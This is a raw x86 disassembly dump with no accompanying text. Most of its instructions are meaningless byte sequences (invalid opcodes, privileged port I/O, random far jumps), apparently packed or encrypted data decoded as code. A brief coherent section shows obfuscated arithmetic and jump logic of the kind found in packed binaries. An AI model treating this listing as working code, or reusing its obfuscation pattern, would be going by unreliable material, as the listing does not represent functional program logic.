  40c691:	and    cl,BYTE PTR [edi-0x54]
  40c694:	ret    0xb97c
  40c697:	data16 mov dl,0x7
  40c69a:	(bad)  
  40c69b:	fadd   QWORD PTR [eax-0x7d239801]
  40c6a1:	xchg   ebx,eax
  40c6a2:	(bad)  
  40c6a3:	or     BYTE PTR [eax+0x3d],ch
  40c6a6:	xchg   cl,bh
  40c6a8:	aam    0xb1
  40c6aa:	add    cl,BYTE PTR [edi-0x4b261101]
  40c6b0:	cmp    ebx,DWORD PTR [eax-0xe]
  40c6b3:	adc    ecx,DWORD PTR [edi+edi*4]
  40c6b6:	adc    BYTE PTR ds:0xffae4e55,al
  40c6bc:	xor    bl,cl
  40c6be:	mov    DWORD PTR [edi+esi*1+0x3be81ae4],edx
  40c6c5:	imul   esp,DWORD PTR [edx+0x4bdc928f],0x55
  40c6cc:	sub    eax,eax
  40c6ce:	sbb    esi,ecx
  40c6d0:	sub    eax,DWORD PTR [eax+0x7d3f919d]
  40c6d6:	dec    ebx
  40c6d7:	inc    ebp
  40c6d8:	mov    BYTE PTR [edi+0x1d2ffc87],dl
  40c6de:	xchg   ecx,eax
  40c6df:	retf   0x27d3
  40c6e2:	mov    WORD PTR [ebp+0x68aa392f],es
  40c6e8:	sbb    DWORD PTR [ebp-0x36],ebx
  40c6eb:	iret   
  40c6ec:	in     eax,dx
  40c6ed:	mov    eax,ds:0xda3e0a3b
  40c6f2:	xlat   BYTE PTR ds:[ebx]
  40c6f3:	jle    0x40c690
  40c6f5:	jecxz  0x40c74d
  40c6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f8:	cwde   
  40c6f9:	mov    ebx,0xef4e971a
  40c6fe:	idiv   BYTE PTR [ecx]
  40c700:	ret    
  40c701:	mov    ebp,0x1b7aeb8e
  40c706:	cmp    al,0x5
  40c708:	rcl    bh,1
  40c70a:	aam    0x1
  40c70c:	icebp  
  40c70d:	sub    eax,0x18722161
  40c712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c713:	dec    ebp
  40c714:	jns    0x40c712
  40c716:	test   DWORD PTR [edx+eiz*2-0x27662c5f],edx
  40c71d:	imul   ebp,DWORD PTR [ecx-0x5e],0x8ae25406
  40c724:	mov    al,0x98
  40c726:	jbe    0x40c6d6
  40c728:	pop    edi
  40c729:	add    edi,DWORD PTR ds:0xa52e9cb5
  40c72f:	(bad)  
  40c730:	mov    ebx,0x94f3a444
  40c735:	mov    WORD PTR [ebp-0x35104c24],?
  40c73b:	dec    ecx
  40c73c:	popf   
  40c73d:	scas   al,BYTE PTR es:[edi]
  40c73e:	sbb    ebx,ebx
  40c740:	mov    ds:0x71a7151f,al
  40c745:	ds loopne 0x40c79e
  40c748:	xchg   ebp,eax
  40c749:	pushf  
  40c74a:	lods   al,BYTE PTR ds:[esi]
  40c74b:	dec    ecx
  40c74c:	sbb    DWORD PTR [ecx+0x79],edx
  40c74f:	cmp    edx,eax
  40c751:	push   edx
  40c752:	xchg   ebx,eax
  40c753:	mov    al,ds:0xb8e3fdea
  40c758:	iret   
  40c759:	int    0x38
  40c75b:	sti    
  40c75c:	or     ecx,eax
  40c75e:	pop    es
  40c75f:	dec    esp
  40c760:	and    al,0xb0
  40c762:	xchg   ebp,eax
  40c763:	xchg   DWORD PTR [ebx],ebx
  40c765:	sbb    ah,al
  40c767:	sub    eax,0xaa620f19
  40c76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c76d:	pushf  
  40c76e:	rol    BYTE PTR [esi],0xc4
  40c771:	or     ebx,DWORD PTR [edx+0x1b]
  40c774:	clc    
  40c775:	fst    QWORD PTR [esi]
  40c777:	dec    ecx
  40c778:	out    dx,al
  40c779:	repnz fwait
  40c77b:	inc    ebp
  40c77c:	mov    ecx,0x96627373
  40c781:	pop    ss
  40c782:	out    dx,eax
  40c783:	inc    ebx
  40c784:	inc    dl
  40c786:	pop    edi
  40c787:	xlat   BYTE PTR ds:[ebx]
  40c788:	mov    al,ss:0x1068c2ac
  40c78e:	sbb    edx,esp
  40c790:	ins    DWORD PTR es:[edi],dx
  40c791:	mov    BYTE PTR [edi-0x15],ch
  40c794:	in     eax,0x24
  40c796:	jns    0x40c779
  40c798:	into   
  40c799:	xor    bh,BYTE PTR [ecx+edx*4]
  40c79c:	loope  0x40c816
  40c79e:	nop
  40c79f:	pop    ebp
  40c7a0:	mov    al,ds:0x1e371e1b
  40c7a5:	xchg   DWORD PTR [esi+edi*4],ebp
  40c7a8:	dec    ecx
  40c7a9:	ins    BYTE PTR es:[edi],dx
  40c7aa:	jns    0x40c732
  40c7ac:	int    0x6d
  40c7ae:	mov    esp,0x86c9e5ac
  40c7b3:	jne    0x40c800
  40c7b5:	jo     0x40c798
  40c7b7:	cmp    DWORD PTR [esi+0x3e],edx
  40c7ba:	mov    WORD PTR [edi+0x522e1ef8],ss
  40c7c0:	cmp    al,0xbc
  40c7c2:	sub    DWORD PTR [eax-0x4d016140],0x30b1b19
  40c7cc:	sahf   
  40c7cd:	hlt    
  40c7ce:	pop    ss
  40c7cf:	mov    ebx,0x2b30c20a
  40c7d4:	aaa    
  40c7d5:	mov    edx,0x9b3204bb
  40c7da:	(bad)  
  40c7db:	scas   eax,DWORD PTR es:[edi]
  40c7dc:	or     eax,0x5f54d593
  40c7e1:	mov    eax,0xc3a4ff52
  40c7e6:	mov    sp,0x8d4f
  40c7ea:	cwde   
  40c7eb:	mov    ds:0xa672f9c7,eax
  40c7f0:	adc    eax,0x38e71963
  40c7f5:	lds    esp,FWORD PTR [ebp+0x4cfe8065]
  40c7fb:	cmp    ah,bh
  40c7fd:	js     0x40c800
  40c7ff:	push   esi
  40c800:	js     0x40c7a1
  40c802:	cmp    cl,BYTE PTR [esi]
  40c804:	cmp    DWORD PTR [ecx-0x6a76e194],edi
  40c80a:	test   al,0xc2
  40c80c:	scas   al,BYTE PTR es:[edi]
  40c80d:	adc    DWORD PTR [eax],ebx
  40c80f:	inc    edi
  40c810:	not    ch
  40c812:	mov    bh,0x88
  40c814:	(bad)  
  40c815:	sub    eax,DWORD PTR [ebp-0x2ad90aa2]
  40c81b:	lea    ecx,[esi+esi*4+0x394cc881]
  40c822:	lea    esi,[edi]
  40c824:	sub    al,0x83
  40c826:	xchg   esp,eax
  40c827:	in     al,dx
  40c828:	or     edi,DWORD PTR [esi+0x4f]
  40c82b:	fcom   DWORD PTR [ebx]
  40c82d:	push   esi
  40c82e:	mov    ch,0x3b
  40c830:	xor    ebx,DWORD PTR [ebx+0xb]
  40c833:	add    al,0x0
  40c835:	add    al,0x7e
  40c837:	and    al,0x9c
  40c839:	(bad)  
  40c83a:	xor    eax,0xa1fab006
  40c83f:	mov    cl,0xb6
  40c841:	lods   eax,DWORD PTR ds:[esi]
  40c842:	mov    ecx,0x1018f8ee
  40c847:	rcl    BYTE PTR ss:[bp+si-0x3921],0xfa
  40c84e:	(bad)  [ebp+0x43]
  40c851:	mov    ecx,0x4b41874d
  40c856:	add    dh,BYTE PTR [edx]
  40c858:	mov    dl,0xc9
  40c85a:	mov    ds:0xed5efd,al
  40c85f:	pop    esi
  40c860:	jmp    0x259c:0x84d8faa6
  40c867:	div    BYTE PTR [ebx-0x39]
  40c86a:	test   eax,0x8cbb9f30
  40c86f:	sbb    cl,dl
  40c871:	inc    ebp
  40c872:	stos   BYTE PTR es:[di],al
  40c874:	dec    esi
  40c875:	daa    
  40c876:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c878:	or     ebp,DWORD PTR [ebx+0xd2bfbfd]
  40c87e:	aad    0x8e
  40c880:	sbb    eax,0xf85b8c9e
  40c885:	jecxz  0x40c8cd
  40c887:	jo     0x40c8cc
  40c889:	jmp    0x3a0d7f1a
  40c88e:	in     al,0x24
  40c890:	cmp    ah,BYTE PTR [edi-0x25]
  40c893:	loopne 0x40c8c1
  40c895:	imul   esp,ebx,0x0
  40c898:	inc    ecx
  40c899:	mov    al,0x96
  40c89b:	jmp    0xf45:0xaf9aabfc
  40c8a2:	and    DWORD PTR [ecx],eax
  40c8a4:	imul   ebx,esp,0x39
  40c8a7:	pop    DWORD PTR [esi]
  40c8a9:	mov    cs,WORD PTR [eax]
  40c8ab:	outs   dx,DWORD PTR ds:[esi]
  40c8ac:	int3   
  40c8ad:	cwde   
  40c8ae:	xor    bl,ah
  40c8b0:	ret    0x208c
  40c8b3:	pop    edx
  40c8b4:	shl    BYTE PTR [ecx],cl
  40c8b6:	mov    eax,0xbc0cb1ac
  40c8bb:	push   cs
  40c8bc:	lahf   
  40c8bd:	scas   eax,DWORD PTR es:[edi]
  40c8be:	arpl   WORD PTR [edi+0x4b],dx
  40c8c1:	mov    edx,0x784bd0a9
  40c8c6:	test   eax,0x3dfda1c1
  40c8cb:	xor    eax,0x86045fd5
  40c8d0:	pop    ebp
  40c8d1:	mov    edi,es
  40c8d3:	mov    ah,0xe
  40c8d5:	sbb    BYTE PTR [ebx+0x4c02e479],al
  40c8db:	pop    eax
  40c8dc:	gs inc eax
  40c8de:	pop    edi
  40c8df:	xchg   edx,eax
  40c8e0:	mov    BYTE PTR [ecx],ch
  40c8e2:	les    ebp,FWORD PTR [eax-0x1cab2e0b]
  40c8e8:	mov    eax,ds:0x4219a533
  40c8ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8ee:	adc    eax,0xc054e54c
  40c8f3:	sbb    dl,BYTE PTR [edi+0x40433463]
  40c8f9:	stos   BYTE PTR es:[edi],al
  40c8fa:	dec    eax
  40c8fb:	mov    ch,0x39
  40c8fd:	dec    eax
  40c8fe:	pop    esp
  40c8ff:	mul    BYTE PTR [ebx+0x2]
  40c902:	fisub  WORD PTR [ebp+0x1bc97d74]
  40c908:	sbb    eax,0x293b9edf
  40c90d:	cmp    al,0x59
  40c90f:	iret   
  40c910:	cmp    ax,0x61c4
  40c914:	or     eax,0x89a9cc4e
  40c919:	popf   
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x5c4c5e53
  40c96a:	mov    ch,0x47
  40c96c:	pop    ecx
  40c96d:	xor    bl,BYTE PTR [ebp+0x7e747878]
  40c973:	js     0x40c9ed
  40c975:	mov    cs,esi
  40c977:	in     al,0x58
  40c979:	xlat   BYTE PTR ds:[ebx]
  40c97a:	mov    BYTE PTR [ecx-0x6b],al
  40c97d:	jbe    0x40c9c8
  40c97f:	or     ax,0x6902
  40c983:	icebp  
  40c984:	push   cs
  40c985:	sub    DWORD PTR [esi-0x2b7e6643],edx
  40c98b:	sub    eax,0xc4ade55a
  40c990:	(bad)  
  40c991:	mov    ecx,0xf7c8645c
  40c996:	ds inc ebx
  40c998:	test   ecx,0x8a08ab37
  40c99e:	jmp    0x3374:0x31f074be
  40c9a5:	and    al,0xc1
  40c9a7:	mov    al,BYTE PTR [edi+0x58756b83]
  40c9ad:	pop    esi
  40c9ae:	into   
  40c9af:	std    
  40c9b0:	inc    eax
  40c9b1:	lods   eax,DWORD PTR ds:[esi]
  40c9b2:	xchg   ebx,eax
  40c9b3:	scas   al,BYTE PTR es:[edi]
  40c9b4:	mov    al,cl
  40c9b6:	cli    
  40c9b7:	xchg   DWORD PTR [edx],eax
  40c9b9:	push   es
  40c9ba:	dec    esi
  40c9bb:	in     eax,0xa9
  40c9bd:	dec    edx
  40c9be:	jmp    0xf6ed:0xe349512
  40c9c5:	stos   DWORD PTR es:[edi],eax
  40c9c6:	dec    ebp
  40c9c7:	sbb    dh,BYTE PTR [eax+0x6]
  40c9ca:	fild   DWORD PTR [edi+0x1a]
  40c9cd:	inc    edx
  40c9ce:	sbb    dh,BYTE PTR [ecx+0x6ccda0e3]
  40c9d4:	fisttp WORD PTR [ebx+0xc142884]
  40c9da:	xchg   ebx,eax
  40c9db:	lods   al,BYTE PTR ds:[esi]
  40c9dc:	cld    
  40c9dd:	or     esi,DWORD PTR [edi-0x38]
  40c9e0:	out    0x16,al
  40c9e2:	rcr    edi,1
  40c9e4:	or     esp,DWORD PTR [edi]
  40c9e6:	icebp  
  40c9e7:	out    0xdd,al
  40c9e9:	push   esi
  40c9ea:	dec    esp
  40c9eb:	mul    ah
  40c9ed:	add    dh,BYTE PTR [ebx-0x63ad0f8c]
  40c9f3:	jecxz  0x40c9b7
  40c9f5:	retf   0x1147
  40c9f8:	xchg   ebx,eax
  40c9f9:	clc    
  40c9fa:	xor    edi,DWORD PTR [eax-0x64]
  40c9fd:	mov    BYTE PTR [esi-0x5d086352],ch
  40ca03:	dec    esp
  40ca04:	add    edx,DWORD PTR [edi]
  40ca06:	aas    
  40ca07:	icebp  
  40ca08:	pop    esp
  40ca09:	xchg   edx,eax
  40ca0a:	mov    ch,0x97
  40ca0c:	stc    
  40ca0d:	dec    edi
  40ca0e:	sbb    eax,0xcd883b05
  40ca13:	jae    0x40c9f7
  40ca15:	add    BYTE PTR [ebx+0x9c36c8e],ch
  40ca1b:	adc    ecx,edx
  40ca1d:	stos   BYTE PTR es:[edi],al
  40ca1e:	fst    QWORD PTR [ebx-0x61]
  40ca21:	popa   
  40ca22:	jge    0x40c9e1
  40ca24:	push   ebp
  40ca25:	xchg   ecx,eax
  40ca26:	ret    0x85d
  40ca29:	jmp    0xddc3:0x3a7fef29
  40ca30:	sti    
  40ca31:	call   0xaac3e01a
  40ca36:	xchg   esi,eax
  40ca37:	or     al,0x46
  40ca39:	mov    ch,0x75
  40ca3b:	mov    ecx,0x3bd9917d
  40ca40:	stos   DWORD PTR es:[edi],eax
  40ca41:	cmp    BYTE PTR [edx],cl
  40ca43:	pop    ebp
  40ca44:	add    al,0xfa
  40ca46:	push   ds
  40ca47:	rcl    ch,0xf8
  40ca4a:	pop    ebp
  40ca4b:	repnz jmp FWORD PTR [edi+0x7883e374]
  40ca52:	jp     0x40ca21
  40ca54:	das    
  40ca55:	adc    al,0xa
  40ca57:	mov    esp,gs
  40ca59:	in     eax,0x3d
  40ca5b:	imul   edx,DWORD PTR [edx],0x5b
  40ca5e:	cmp    eax,0xffdb9ebd
  40ca63:	scas   al,BYTE PTR es:[edi]
  40ca64:	sbb    eax,0x52f48c67
  40ca69:	in     eax,0x25
  40ca6b:	loope  0x40ca8c
  40ca6d:	mov    bh,0x97
  40ca6f:	ret    0x7976
  40ca72:	xchg   edx,eax
  40ca73:	dec    ecx
  40ca74:	loope  0x40ca68
  40ca76:	xchg   BYTE PTR [edi],bh
  40ca78:	(bad)  
  40ca79:	fwait
  40ca7a:	ja     0x40caeb
  40ca7c:	xor    dl,BYTE PTR [ecx-0x6b00ccee]
  40ca82:	out    0x5a,eax
  40ca84:	sbb    al,0x19
  40ca86:	movsx  ecx,WORD PTR [edx]
  40ca89:	dec    ebp
  40ca8a:	sub    dl,BYTE PTR [ecx-0x1faa9f92]
  40ca90:	loope  0x40caae
  40ca92:	xor    eax,0x12d87efc
  40ca97:	icebp  
  40ca98:	xchg   DWORD PTR [ebx+0x40c90342],esp
  40ca9e:	mov    ebx,0xa7a33d84
  40caa3:	mov    ebp,0x87e39e2d
  40caa8:	scas   al,BYTE PTR es:[edi]
  40caa9:	add    al,0xb6
  40caab:	gs sbb eax,0x5caf9783
  40cab1:	mov    ?,edx
  40cab3:	xor    BYTE PTR [eax+0x57],ah
  40cab6:	inc    ebp
  40cab7:	call   0xd0c42f70
  40cabc:	stos   DWORD PTR es:[edi],eax
  40cabd:	daa    
  40cabe:	mov    eax,0x260ae3fa
  40cac3:	popf   
  40cac4:	jno    0x40cb04
  40cac6:	mul    DWORD PTR [edi+eiz*2+0x22]
  40caca:	xor    al,0x8b
  40cacc:	std    
  40cacd:	xchg   ecx,eax
  40cace:	jle    0x40cb34
  40cad0:	ror    al,1
  40cad2:	aaa    
  40cad3:	int    0x21
  40cad5:	mov    bl,BYTE PTR [ebx+0x46e58842]
  40cadb:	cli    
  40cadc:	sub    al,al
  40cade:	test   BYTE PTR [ebx-0x7c],0xaa
  40cae2:	jg     0x40cb48
  40cae4:	sbb    DWORD PTR [edx+0x34064a68],esi
  40caea:	mov    bl,0xc3
  40caec:	ds mov dl,0x9b
  40caef:	pop    ebx
  40caf0:	fwait
  40caf1:	(bad)
  40caf4:	test   eax,0x73dca496
  40caf9:	mov    BYTE PTR [eax+0x5],al
  40cafc:	add    dl,BYTE PTR [ecx+0x2d]
  40caff:	stos   DWORD PTR es:[edi],eax
  40cb00:	pushf  
  40cb01:	mov    DWORD PTR [ebx],esp
  40cb03:	aam    0xf0
  40cb05:	inc    esi
  40cb06:	dec    ebx
  40cb07:	xor    al,0x2a
  40cb09:	jbe    0x40cb6a
  40cb0b:	lock ja 0x40ca95
  40cb0e:	push   cs
  40cb0f:	loope  0x40cb88
  40cb11:	xor    al,0xef
  40cb13:	enter  0x382a,0x2c
  40cb17:	lock mov ebp,0x45d49ac7
  40cb1d:	pop    esp
  40cb1e:	and    BYTE PTR [eax],bh
  40cb20:	inc    ebx
  40cb21:	xlat   BYTE PTR ds:[ebx]
  40cb22:	or     al,dl
  40cb24:	push   cs
  40cb25:	pop    ds
  40cb26:	adc    BYTE PTR [ebx+0x53],dl
  40cb29:	sub    esp,DWORD PTR [ebp+0x63]
  40cb2c:	fcmovb st,st(4)
  40cb2e:	sbb    edx,DWORD PTR [ebx]
  40cb30:	sub    BYTE PTR [ebx+0x4a],al
  40cb33:	hlt    
  40cb34:	sub    bl,bh
  40cb36:	xor    al,0xc9
  40cb38:	push   ds
  40cb39:	sbb    eax,0xf86cdd2
  40cb3e:	push   ebp
  40cb3f:	(bad)  
  40cb40:	fcomp  QWORD PTR [ecx]
  40cb42:	xchg   ecx,eax
  40cb43:	fs aad 0x31
  40cb46:	cmp    edx,DWORD PTR [eax+edx*4+0x7a]
  40cb4a:	int3   
  40cb4b:	inc    esp
  40cb4c:	mov    ch,0xce
  40cb4e:	fbld   TBYTE PTR [ecx-0x7f]
  40cb51:	cmp    esp,ebx
  40cb53:	xchg   ecx,eax
  40cb54:	std    
  40cb55:	(bad)  
  40cb56:	cli    
  40cb57:	data16 xor ah,BYTE PTR [esi+eiz*2-0x37f88126]
  40cb5f:	push   ss
  40cb60:	mov    ebx,0xeb61326d
  40cb65:	shr    BYTE PTR [edx],0x7
  40cb68:	(bad)  
  40cb6b:	frstor [esi+0x208d0b74]
  40cb71:	push   ebp
  40cb72:	inc    esi
  40cb73:	call   0x5a926960
  40cb78:	aam    0x48
  40cb7a:	icebp  
  40cb7b:	repz xor al,0x77
  40cb7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb7f:	fidiv  WORD PTR [edx]
  40cb81:	shl    DWORD PTR [esi],cl
  40cb83:	mov    al,ds:0x5b4a00d5
  40cb88:	test   eax,0xc4e3634b
  40cb8d:	mov    WORD PTR [ebx],fs
  40cb8f:	push   edi
  40cb90:	and    eax,0xe431df5e
  40cb95:	sub    ecx,esi
  40cb97:	inc    esi
  40cb98:	mov    ecx,0x889337dd
  40cb9d:	pop    ds
  40cb9e:	test   eax,0xc397e8e3
  40cba3:	jae    0x40cc16
  40cba5:	inc    BYTE PTR [edi+0x6a7439e5]
  40cbab:	add    esp,DWORD PTR [ebx+ebx*2-0x19]
  40cbaf:	mov    ch,0x20
  40cbb1:	xchg   ecx,eax
  40cbb2:	add    eax,0xa35da62d
  40cbb7:	jo     0x40cbd0
  40cbb9:	jecxz  0x40cbbb
  40cbbb:	ss mov dl,0x3c
  40cbbe:	pop    ebx
  40cbbf:	sbb    esi,DWORD PTR [ebp+edx*1-0x35]
  40cbc3:	mov    cs,WORD PTR cs:[ebx]
  40cbc6:	(bad)  
  40cbc8:	push   ss
  40cbc9:	add    edi,DWORD PTR [edx]
  40cbcb:	retf   
  40cbcc:	clc    
  40cbcd:	mov    eax,0x5320abdc
  40cbd2:	mov    dl,0x43
  40cbd4:	out    0x82,al
  40cbd6:	aas    
  40cbd7:	stos   DWORD PTR es:[edi],eax
  40cbd8:	fadd   QWORD PTR [edx]
  40cbda:	retf   
  40cbdb:	push   esi
  40cbdc:	adc    DWORD PTR [ebp+0x452a3fe3],ebp
  40cbe2:	push   edx
  40cbe3:	test   eax,0x2740e2d6
  40cbe8:	xchg   esp,eax
  40cbe9:	pop    edx
  40cbea:	jno    0x40cbfd
  40cbec:	int    0x7b
  40cbee:	cmp    BYTE PTR [ebx],0x2
  40cbf1:	scas   eax,DWORD PTR es:[edi]
  40cbf2:	pushf  
  40cbf3:	lock or al,0x49
  40cbf6:	jmp    0x7e2:0xf5804e61
  40cbfd:	gs xchg edi,eax
  40cbff:	cs dec ebx
  40cc01:	and    bh,BYTE PTR [ebp+0x64f2574]
  40cc07:	mov    edi,0xce50e7
  40cc0c:	pop    eax
  40cc0d:	cs jp  0x40cc56
  40cc10:	mov    ds:0xdaa77ed8,al
  40cc15:	popf   
  40cc16:	shl    DWORD PTR [ecx],cl
  40cc18:	ds push es
  40cc1a:	icebp  
  40cc1b:	jne    0x40cbb3
  40cc1d:	repnz pop ecx
  40cc1f:	mov    al,0x93
  40cc21:	jp     0x40cba8
  40cc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc24:	lea    edx,[ebx-0x72ab2347]
  40cc2a:	sbb    eax,0xd38c2f39
  40cc2f:	push   ss
  40cc30:	aam    0x53
  40cc32:	pusha  
  40cc33:	or     BYTE PTR [esi-0x36344f5],bl
  40cc39:	lods   al,BYTE PTR ds:[esi]
  40cc3a:	pop    ebx
  40cc3b:	xor    al,0x6b
  40cc3d:	add    al,0xa7
  40cc3f:	(bad)  
  40cc40:	mov    DWORD PTR [edx-0x457b2fd],ecx
  40cc46:	cmp    ebx,DWORD PTR [ecx-0x56]
  40cc49:	sub    dl,0x15
  40cc4c:	and    eax,0xbf8ec718
  40cc51:	jmp    0x1f830afc
  40cc56:	mov    eax,ds:0x72bb62cc
  40cc5b:	mov    bl,BYTE PTR [edi+ecx*1]
  40cc5e:	sbb    dh,bh
  40cc60:	repnz mov esp,0xeedc1b04
  40cc66:	mov    ds:0xf7db61af,eax
  40cc6b:	mov    ebp,0x27c8f6f7
  40cc70:	ret    
  40cc71:	cmp    DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xda
  40cc85:	shr    BYTE PTR [eax+0x69],cl
  40cc88:	mov    cs:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	and    DWORD PTR [edx-0xf4af17c],esi
  40cc96:	mov    BYTE PTR [ebx+0x2bee265],ch
  40cc9c:	dec    edi
  40cc9d:	xor    eax,0xf381b0ac
  40cca2:	push   edx
  40cca3:	jnp    0x40ccd6
  40cca5:	jp     0x40ccc1
  40cca7:	cdq    
  40cca8:	jbe    0x40ccda
  40ccaa:	sub    edi,edx
  40ccac:	(bad)  
  40ccae:	fsubr  DWORD PTR [eax+0x5e]
  40ccb1:	jp     0x40cc78
  40ccb3:	add    esi,DWORD PTR [esi+0x57b0b351]
  40ccb9:	in     al,0x73
  40ccbb:	push   es
  40ccbc:	pop    ds
  40ccbd:	mov    al,0x92
  40ccbf:	jae    0x40cc67
  40ccc1:	pop    ebp
  40ccc2:	inc    ebx
  40ccc3:	or     DWORD PTR [ebx],ecx
  40ccc5:	cmp    edx,DWORD PTR [ebx-0x34]
  40ccc8:	push   ss
  40ccc9:	popf   
  40ccca:	push   esp
  40cccb:	les    edx,FWORD PTR [edx+eiz*8+0x72e23b39]
  40ccd2:	sub    BYTE PTR [esi],bl
  40ccd4:	mov    ch,0x2b
  40ccd6:	mov    edx,0x9bb5b2fa
  40ccdb:	mov    cs,WORD PTR [edi+edi*1+0xb]
  40ccdf:	pushf  
  40cce0:	test   al,0x3a
  40cce2:	dec    edx
  40cce3:	sbb    eax,0x6040432
  40cce8:	hlt    
  40cce9:	jnp    0x40cc9e
  40cceb:	mov    ch,0x0
  40cced:	mov    ah,0x1d
  40ccef:	ds dec eax
  40ccf1:	and    al,0xe2
  40ccf3:	nop
  40ccf4:	or     edx,ebx
  40ccf6:	jmp    0xcfb658fa
  40ccfb:	(bad)  
  40ccfc:	retf   0x8b29
  40ccff:	push   edi
  40cd00:	mov    dl,BYTE PTR ds:0xd698ad3
  40cd06:	adc    esp,ebx
  40cd08:	and    ebp,DWORD PTR [edx-0x41]
  40cd0b:	out    dx,eax
  40cd0c:	inc    DWORD PTR [ebx+esi*1]
  40cd0f:	es push cs
  40cd11:	inc    eax
  40cd12:	push   ds
  40cd13:	lods   al,BYTE PTR ds:[esi]
  40cd14:	mov    bh,0x9a
  40cd16:	lock ins BYTE PTR es:[edi],dx
  40cd18:	mov    ebx,0xb7db4001
  40cd1d:	or     ecx,DWORD PTR [esi-0x3d8e83f2]
  40cd23:	dec    eax
  40cd24:	imul   esp,DWORD PTR ds:0x2d1a412f,0xbf79c379
  40cd2e:	int    0xd5
  40cd30:	shr    DWORD PTR [ebp+0x28],0xd7
  40cd34:	mov    cs,WORD PTR [eax-0x69]
  40cd37:	fwait
  40cd38:	xchg   edx,eax
  40cd39:	pop    esp
  40cd3a:	(bad)  
  40cd3b:	shr    ah,1
  40cd3d:	mov    dl,ch
  40cd3f:	mov    WORD PTR [edx-0x5e],es
  40cd42:	pop    edx
  40cd43:	jbe    0x40cdb5
  40cd45:	cmp    al,0x1d
  40cd47:	dec    esi
  40cd48:	or     dh,BYTE PTR [esi]
  40cd4a:	pop    ebx
  40cd4b:	stos   DWORD PTR es:[edi],eax
  40cd4c:	rcr    BYTE PTR [ebp+eiz*2+0x3ea8d7d9],0xdf
  40cd54:	out    dx,eax
  40cd55:	call   0x33f:0x88d3a425
  40cd5c:	xor    DWORD PTR [edi],ecx
  40cd5e:	sbb    DWORD PTR [eax],ecx
  40cd60:	loopne 0x40cd7a
  40cd62:	js     0x40cce5
  40cd64:	and    ch,al
  40cd66:	xchg   edi,eax
  40cd67:	push   0xec9d40d5
  40cd6c:	sub    esp,DWORD PTR [edx-0x4035df08]
  40cd72:	iret   
  40cd73:	and    eax,0xf50fc4c0
  40cd78:	test   DWORD PTR [edi-0x6b],esp
  40cd7b:	jns    0x40cd6f
  40cd7d:	pop    edi
  40cd7e:	dec    esi
  40cd7f:	into   
  40cd80:	add    BYTE PTR [esi+esi*1+0x14bc5118],bl
  40cd87:	mov    ?,ecx
  40cd89:	xor    BYTE PTR [bx+di],0x2c
  40cd8d:	popa   
  40cd8e:	pop    edi
  40cd8f:	sbb    DWORD PTR [edi+0x63],0xffffffbf
  40cd93:	aas    
  40cd94:	dec    edi
  40cd95:	mov    dh,0x17
  40cd97:	cmp    al,0xfe
  40cd99:	inc    esi
  40cd9a:	xchg   ebp,eax
  40cd9b:	push   edi
  40cd9c:	imul   esi,DWORD PTR [edi-0x41],0xffffffe2
  40cda0:	test   BYTE PTR [ebx-0x78050252],al
  40cda6:	push   ss
  40cda7:	dec    edx
  40cda8:	das    
  40cda9:	pop    ebp
  40cdaa:	push   esp
  40cdab:	stc    
  40cdac:	or     ebx,DWORD PTR [ebx]
  40cdae:	(bad)
  40cdb2:	xchg   BYTE PTR [eax],ah
  40cdb4:	sbb    DWORD PTR [ebp-0x73],edx
  40cdb7:	lods   al,BYTE PTR ds:[esi]
  40cdb8:	shl    bl,0x92
  40cdbb:	dec    edx
  40cdbc:	(bad)  
  40cdbd:	fcmovb st,st(2)
  40cdbf:	mov    dl,0xb8
  40cdc1:	jo     0x40cd87
  40cdc3:	pop    ebp
  40cdc4:	sbb    esi,DWORD PTR [edi-0x3b]
  40cdc7:	mul    BYTE PTR [esp+ebx*1]
  40cdca:	dec    ebx
  40cdcb:	out    dx,al
  40cdcc:	jne    0x40cd71
  40cdce:	test   BYTE PTR [esi-0x5a],bl
  40cdd1:	enter  0x1ce4,0xe3
  40cdd5:	mov    dl,0xd5
  40cdd7:	jns    0x40cddc
  40cdd9:	cmp    eax,0x2b0420f9
  40cdde:	sbb    al,0xd4
  40cde0:	fsub   DWORD PTR [ecx-0x2699bbdc]
  40cde6:	push   esp
  40cde7:	das    
  40cde8:	test   DWORD PTR [edi+ecx*8+0xec2a1b9],0xf85e0b9f
  40cdf3:	jno    0x40cda7
  40cdf5:	mov    dl,0xa4
  40cdf7:	pop    esi
  40cdf8:	ror    WORD PTR [esi-0x3166baf2],0x72
  40ce00:	sbb    eax,0x83cc62ad
  40ce05:	sub    ecx,DWORD PTR [ebx+0x73abeb93]
  40ce0b:	sbb    esi,DWORD PTR [edi-0x11]
  40ce0e:	imul   ebx,DWORD PTR [eax],0xfffffffb
  40ce11:	imul   eax,DWORD PTR [edx],0xb846856d
  40ce17:	add    BYTE PTR [ebp+0x10],ch
  40ce1a:	pop    edi
